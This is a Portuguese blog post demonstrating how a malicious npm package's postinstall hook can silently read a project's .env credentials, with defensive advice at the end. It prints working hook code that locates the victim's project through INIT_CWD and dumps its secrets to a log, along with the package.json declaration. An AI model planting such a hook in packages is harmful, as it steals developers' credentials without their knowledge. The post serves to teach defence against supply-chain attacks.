---
title: "Um npm install pode te fazer perder tudo"
date: 2026-06-13
type: security
tags: [segurança, npm, supply chain, node.js, javascript, infosec]
description: "Montei um experimento que mostra como um pacote npm malicioso pode roubar todas as suas credenciais durante o npm install, sem emitir nenhum output suspeito no terminal."
cover: /blog/_content/um-npm-install-pode-te-fazer-perder-tudo/cover.png
coverAlt: "Terminal mostrando npm install rodando enquanto credenciais são exfiltradas silenciosamente"
draft: false
---

Você não precisa ser enganado para instalar um pacote malicioso. Pode ser um typo no nome, uma dependência transitiva que você nunca viu, ou a conta de um mantenedor que foi comprometida. E quando isso acontece, o npm tem um mecanismo que executa código arbitrário na sua máquina automaticamente, sem pedir confirmação, sem mostrar aviso: o lifecycle script.

Montei um experimento para demonstrar isso do jeito mais direto possível.

---

## O vetor: postinstall

O npm executa scripts em eventos do ciclo de vida de um pacote. O mais crítico é o `postinstall`, que roda automaticamente assim que o pacote é instalado.

```
npm install
    └── resolve dependências
        └── instala pacote infectado
            └── executa postinstall ← código malicioso roda aqui
```

Tudo que um pacote precisa fazer é declarar isso no `package.json`:

```json
{
  "scripts": {
    "postinstall": "node postinstall.js"
  }
}
```

A partir daí, qualquer coisa dentro de `postinstall.js` roda com as permissões do usuário que executou o `npm install`. Acesso ao sistema de arquivos, variáveis de ambiente, rede, o que você preferir.

---

## O experimento

A estrutura é simples: um pacote chamado `infected` e um projeto vítima que o declara como dependência.

```
supplychain/
├── infected/
│   ├── package.json     ← define o postinstall
│   ├── postinstall.js   ← código malicioso
│   └── stolen.log       ← onde os dados são gravados
└── project/
    ├── package.json     ← depende de "infected"
    └── .env             ← credenciais da vítima
```

O projeto vítima tem um `.env` com credenciais típicas de qualquer aplicação:

```
DATABASE_URL=postgres://admin:s3cr3t@localhost:5432/mydb
API_KEY=sk-fake1234567890abcdef
JWT_SECRET=super_secret_jwt_token
STRIPE_KEY=pk_test_fakestripekey123
```

E o `postinstall.js` do pacote infectado:

```js
const fs = require("fs");
const path = require("path");

const projectRoot = process.env.INIT_CWD || process.cwd();
const envPath = path.join(projectRoot, ".env");
const logPath = path.join(__dirname, "stolen.log");

function log(msg) {
  fs.appendFileSync(logPath, msg + "\n");
}

log("[!] postinstall hook executado pelo pacote 'infected'");
log("[!] Lendo .env em: " + envPath);

if (!fs.existsSync(envPath)) {
  log("[!] Nenhum arquivo .env encontrado.");
  process.exit(0);
}

const contents = fs.readFileSync(envPath, "utf8");

log("\n========== PROJETO NOVO INSTALADO ==========");
log(contents.trimEnd());
log("============================================\n");
```

São 25 linhas. Sem dependências externas. Tudo da stdlib do Node.

---

## O ataque na prática

O experimento usa dois terminais para simular os dois lados.

**Terminal do atacante** (escuta o log em tempo real):

```bash
make tail
```

**Terminal da vítima** (instala as dependências):

```bash
make run
```

### O que a vítima vê

```
added 1 package, and audited 3 packages in 1s

found 0 vulnerabilities
```

É isso. Output completamente normal. Nenhuma indicação de que algo aconteceu.

### O que aparece no terminal do atacante

```
[!] postinstall hook executado pelo pacote 'infected'
[!] Lendo .env em: /path/to/project/.env

========== PROJETO NOVO INSTALADO ==========
DATABASE_URL=postgres://admin:s3cr3t@localhost:5432/mydb
API_KEY=sk-fake1234567890abcdef
JWT_SECRET=super_secret_jwt_token
STRIPE_KEY=pk_test_fakestripekey123
============================================
```

As credenciais chegam em tempo real, exatamente quando o `postinstall` executa.

<video controls width="100%" style="border-radius: 8px; margin-bottom: 1rem;">
  <source src="/blog/_content/um-npm-install-pode-te-fazer-perder-tudo/supplychain.mp4" type="video/mp4" />
</video>

---

## Por que o output some

A partir do npm 7, todo stdout e stderr de lifecycle scripts é suprimido por padrão no terminal. Isso pode dar a impressão de que o código seria visível ou detectado, mas não é. O script executa normalmente, simplesmente não imprime nada na tela da vítima.

Gravar em arquivo, fazer uma requisição HTTP, exfiltrar via DNS, qualquer operação de I/O funciona sem nenhuma flag especial. O silêncio é uma feature do npm, não uma barreira.

---

## INIT_CWD: como o script sabe onde você está

`process.cwd()` retorna o diretório do próprio pacote instalado, não do projeto que o instalou. Mas o npm injeta automaticamente a variável `INIT_CWD` em todos os lifecycle scripts. Ela contém o diretório onde o `npm install` foi executado, ou seja, a raiz do projeto da vítima.

É assim que o script chega até o `.env` sem precisar adivinhar nada:

```js
const projectRoot = process.env.INIT_CWD || process.cwd();
const envPath = path.join(projectRoot, ".env");
```

Essa variável existe desde o npm 6.4 e está documentada. Não é um exploit, é API pública.

---

## Como isso chega ao seu projeto na vida real

O experimento usa uma referência local (`file:../infected`) para fins de demonstração. Num ataque real, o vetor mais comum é um dos três:

**Typosquatting.** Publicar um pacote com nome similar ao de um legítimo. Você digita `axios` errado uma vez, instala `axois`, e o postinstall roda. Levantamentos periódicos do npm registry encontram centenas de pacotes assim ativos a cada mês.

**Comprometimento de conta.** O mantenedor de um pacote popular tem a conta comprometida. Uma nova versão é publicada com o postinstall adicionado. Qualquer projeto que rode `npm update` ou `npm install` pega a versão maliciosa. Foi o que aconteceu com o `event-stream` em 2018 e com o `ua-parser-js` em 2021.

**Dependência transitiva.** Você nunca adicionou o pacote malicioso diretamente. Ele entrou como dependência de uma dependência. O `package-lock.json` tem centenas de entradas, ninguém revisa todas.

---

## Como se proteger

**Audite antes de adicionar.** Verifique o repositório, os mantenedores, o histórico de versões e os lifecycle scripts antes de adicionar qualquer dependência nova. `npm pack <pacote>` e inspecionar o conteúdo custa poucos minutos.

**`npm install --ignore-scripts` quando possível.** Desabilita todos os lifecycle scripts durante a instalação. Pode quebrar pacotes com binários nativos que precisam compilar no postinstall, mas para dependências puramente JS geralmente funciona.

**Revise o `package-lock.json` em code review.** Mudanças inesperadas de versão de dependências transitivas são sinal de alerta. Um pacote que você não conhece aparecendo pela primeira vez merece atenção.

**Use `npm ci` em produção.** Instala exatamente o que está no lockfile sem resolver novas versões. Não é proteção contra o lockfile já comprometido, mas impede que uma atualização silenciosa traga um pacote novo.

**Socket.dev e `npm audit`.** O `npm audit` verifica CVEs conhecidos. O Socket.dev vai além e analisa comportamento, sinalizando pacotes que acessam o sistema de arquivos ou fazem chamadas de rede em lifecycle scripts.

---

O código completo do experimento está em [github.com/josephfelix/supplychain-env-simulation](https://github.com/josephfelix/supplychain-env-simulation).
